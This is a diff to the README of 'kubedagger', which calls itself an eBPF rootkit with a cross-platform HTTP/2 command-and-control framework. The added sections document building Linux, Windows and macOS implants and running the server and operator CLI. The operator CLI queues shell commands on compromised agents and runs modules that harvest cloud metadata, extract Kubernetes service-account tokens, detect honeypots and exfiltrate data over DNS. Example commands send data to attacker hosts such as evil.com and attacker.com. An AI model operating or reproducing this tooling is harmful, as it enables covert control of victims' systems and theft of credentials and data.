@@ -63,6 +63,11 @@
   - [Leader Election Disruption](#55-leader-election-disruption)
   - [Certificate Rotation Sabotage](#56-certificate-rotation-sabotage)
   - [Kernel Keyring MITM](#57-kernel-keyring-mitm)
+- [HTTP/2 C2 Framework](#http2-c2-framework)
+  - [C2 Server](#c2-server)
+  - [Agent](#agent)
+  - [Operator CLI](#operator-cli)
+  - [Module System](#module-system)
 - [Encrypted C2 Channel](#encrypted-c2-channel)
 - [Persistence](#persistence)
 - [Multi-Node Coordination](#multi-node-coordination)
@@ -82,16 +87,30 @@
 ## Building
 
 ```shell
-# Build everything (server, client, webapp)
+# Build everything (eBPF + all binaries)
 make
+
+# Build only the C2 server
+make build-server
+
+# Build cross-platform agents (linux/amd64, windows/amd64, darwin/arm64)
+make build-agent
+
+# Build operator CLI
+make build-operator
 
 # Install client to /usr/bin/
 make install_client
 ```
 
 This produces binaries in `./bin/`:
-- `kubedagger` — the server (loads eBPF programs)
-- `kubedagger-client` — the C2 client
+- `kubedagger` — the eBPF rootkit daemon (Linux only, requires root)
+- `kubedagger-client` — CLI for interacting with the eBPF daemon
+- `kubedagger-server` — HTTP/2 C2 server with mTLS agent listener + management port
+- `kubedagger-agent-linux` — cross-platform agent (Linux amd64)
+- `kubedagger-agent-windows.exe` — cross-platform agent (Windows amd64)
+- `kubedagger-agent-darwin` — cross-platform agent (macOS arm64)
+- `kubedagger-operator` — operator CLI for managing agents and tasks
 - `webapp` — the web-based control panel
 
 ---
@@ -1668,9 +1687,161 @@ kubedagger-client keyring-mitm --target-key-type logon --replace-with "/tmp/evil
 
 ---
 
+## HTTP/2 C2 Framework
+
+The HTTP/2 C2 framework provides a cross-platform command-and-control infrastructure with mTLS transport, a task queue, and a module system. It runs independently of the eBPF components and supports Linux, Windows, and macOS targets.
+
+### C2 Server
+
+The server (`kubedagger-server`) listens for agent check-ins over HTTP/2 and exposes a management port for operator interaction.
+
+```shell
+# Development mode (no TLS)
+./bin/kubedagger-server -key mypassphrase -plaintext
+
+# Production mode (mTLS with auto-generated certs)
+./bin/kubedagger-server -key $KEY
+
+# Production mode (custom certs)
+./bin/kubedagger-server -key $KEY -ca ca.pem -cert server.pem -key-file server-key.pem
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-listen` | `0.0.0.0:443` | HTTP/2 listener address for agents |
+| `-mgmt` | `127.0.0.1:9443` | Management port for operator CLI |
+| `-key` | (required) | Encryption key (hex or passphrase) for management port |
+| `-ca` | (auto-generate) | Path to CA cert PEM |
+| `-cert` | (auto-generate) | Path to server cert PEM |
+| `-key-file` | (auto-generate) | Path to server key PEM |
+| `-plaintext` | `false` | Disable TLS (development only) |
+| `-log-level` | `info` | Log level (debug, info, warn, error) |
+
+**Protocol endpoints:**
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/checkin` | POST | Agent beacon (registers/updates heartbeat) |
+| `/task` | POST | Agent polls for pending tasks |
+| `/result` | POST | Agent submits task output |
+
+### Agent
+
+The agent (`kubedagger-agent`) is a cross-platform implant that beacons to the C2 server, executes tasks, and reports results.
+
+```shell
+# Development mode
+./bin/kubedagger-agent-linux -server http://10.0.2.5:443 -plaintext
+
+# Production mode (mTLS)
+./bin/kubedagger-agent-linux -server https://c2.example.com:443 \
+  -ca ca.pem -cert agent.pem -key agent-key.pem
+
+# Custom agent ID
+./bin/kubedagger-agent-linux -server https://c2.example.com:443 \
+  -id node01-prod -ca ca.pem -cert agent.pem -key agent-key.pem
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-server` | `https://127.0.0.1:443` | C2 server URL |
+| `-id` | (auto-generated) | Agent identifier |
+| `-ca` | (required for TLS) | Path to CA cert PEM for server verification |
+| `-cert` | (required for TLS) | Path to agent client cert PEM |
+| `-key` | (required for TLS) | Path to agent client key PEM |
+| `-plaintext` | `false` | Disable TLS (development only) |
+| `-log-level` | `info` | Log level |
+
+**Agent behavior:**
+- Beacon interval: 30 seconds (server-controlled)
+- Jitter: ±20% randomization on sleep intervals
+- Retry: exponential backoff on connection failure (max 5 retries)
+- Auto-generated agent ID: 16-character hex string
+
+### Operator CLI
+
+The operator CLI (`kubedagger-operator`) connects to the server's management port to list agents, queue tasks, and retrieve results.
+
+```shell
+# List connected agents
+./bin/kubedagger-operator -key $KEY agents
+
+# Execute shell command
+./bin/kubedagger-operator -key $KEY shell <agent-id> whoami
+
+# Run a module
+./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery
+
+# Run module with arguments
+./bin/kubedagger-operator -key $KEY module <agent-id> dns_exfil domain=evil.com data=secret
+
+# List tasks for an agent
+./bin/kubedagger-operator -key $KEY tasks <agent-id>
+
+# Get task output
+./bin/kubedagger-operator -key $KEY status <task-id>
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-addr` | `127.0.0.1:9443` | Management server address |
+| `-key` | (required) | Encryption key (must match server's `-key`) |
+| `-log-level` | `warn` | Log level |
+
+**Commands:**
+
+| Command | Usage | Description |
+|---------|-------|-------------|
+| `agents` | `agents` | List connected agents with OS, arch, last seen |
+| `shell` | `shell <agent-id> <command...>` | Queue a shell command on target agent |
+| `module` | `module <agent-id> <name> [key=value...]` | Run a module with optional arguments |
+| `tasks` | `tasks <agent-id>` | List all tasks for an agent |
+| `status` | `status <task-id>` | Get detailed task status and output |
+
+### Module System
+
+Agents include a built-in module system for executing specialized techniques without requiring shell commands. Modules are platform-aware and will refuse to run on unsupported operating systems.
+
+**Available modules:**
+
+| Module | Platforms | Description |
+|--------|-----------|-------------|
+| `cloud_metadata` | linux, darwin | Query cloud provider metadata services (AWS, GCP, Azure) |
+| `k8s_discovery` | linux, windows, darwin | Enumerate Kubernetes cluster resources via service account |
+| `sa_token` | linux, windows, darwin | Read and decode Kubernetes service account tokens |
+| `dns_exfil` | linux, windows, darwin | Exfiltrate data via DNS TXT queries |
+| `honeypot_detect` | linux, windows, darwin | Detect honeypots and deception infrastructure |
+
+**Module usage via operator:**
+
+```shell
+# Cloud metadata harvesting
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_metadata
+
+# Kubernetes cluster discovery
+./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery
+
+# Service account token extraction
+./bin/kubedagger-operator -key $KEY module <agent-id> sa_token
+
+# DNS exfiltration with custom domain
+./bin/kubedagger-operator -key $KEY module <agent-id> dns_exfil domain=attacker.com data=sensitivedata
+
+# Honeypot detection
+./bin/kubedagger-operator -key $KEY module <agent-id> honeypot_detect
+```
+
+---
+
 ## Encrypted C2 Channel
 
-An alternative to the HTTP-based C2 that uses ChaCha20-Poly1305 encryption over raw TCP.
+An alternative to the HTTP-based C2 that uses ChaCha20-Poly1305 encryption over raw TCP. This is also used internally by the management port (operator CLI ↔ server).
 
 ### Server setup
 
